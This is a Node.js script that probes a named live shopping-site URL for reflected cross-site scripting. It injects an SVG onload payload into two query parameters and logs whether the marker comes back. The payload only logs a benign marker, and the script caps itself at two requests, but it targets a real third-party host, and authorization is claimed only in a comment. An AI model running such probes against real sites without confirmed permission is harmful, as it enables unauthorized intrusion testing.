import { mkdir, writeFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { setTimeout } from 'node:timers/promises';

// Authorized URL only. Two GETs max. Payload only logs a synthetic marker if
// executed; no cookie/storage access, external requests, writes or dialogs.
const target = 'https://direct.e-lina.co.kr/emall/P00303.htm?t=S1_2106_A_01';
const marker = 'AUDIT_XSS_20261030_R9';
const payload = `\"'><svg onload=console.info('${marker}')>`;
const folder = new URL(`direct-xss-evidence/${new Date().toISOString().replace(/[:.]/g, '-')}/`, import.meta.url);
await mkdir(folder, { recursive: true });
const records = [];
for (const parameter of ['audit_probe', 't']) {
  if (records.length) await setTimeout(1500);
  const url = new URL(target);
  url.searchParams.set(parameter, parameter === 't' ? 'S1_2106_A_01' + payload : payload);
  const record = { parameter, url: url.href, requestedAt: new Date().toISOString() };
  records.push(record);
  try {
    const response = await fetch(url, { redirect: 'manual', credentials: 'omit',
      signal: AbortSignal.timeout(15000),
      headers: { 'User-Agent': 'Authorized-Security-Review/1.0', Accept: 'text/html' } });
    record.status = response.status;
    record.headers = Object.fromEntries(['content-type', 'content-security-policy',
      'x-frame-options', 'location'].filter(k => response.headers.has(k)).map(k => [k, response.headers.get(k)]));
    if (response.status >= 300) {
      await response.body?.cancel();
      record.stopped = 'Non-success status: no redirect, retry or further probes';
      break;
    }
    const chunks = [];
    let bytes = 0;
    for await (const chunk of response.body) {
      bytes += chunk.length;
      if (bytes > 1024 * 1024) throw new Error('Response exceeds 1 MiB');
      chunks.push(chunk);
    }
    const body = Buffer.concat(chunks);
    const text = body.toString('utf8');
    record.bytes = body.length;
    record.sha256 = createHash('sha256').update(body).digest('hex');
    record.markerReflected = text.includes(marker);
    record.rawPayloadReflected = text.includes(payload);
    record.bodyFile = `${parameter}.html`;
    await writeFile(new URL(record.bodyFile, folder), body);
  } catch (error) {
    record.error = { message: error.message, cause: error.cause?.code };
    break;
  }
}
const result = { target, marker, payload, records,
  limits: ['No browser execution: cannot establish DOM XSS or script execution.',
    'No AI endpoint identified or tested.', 'No WAF evasion, retry or traffic expansion.'] };
await writeFile(new URL('results.json', folder), JSON.stringify(result, null, 2) + '\n');
console.log(JSON.stringify({ folder: folder.pathname, ...result }, null, 2));
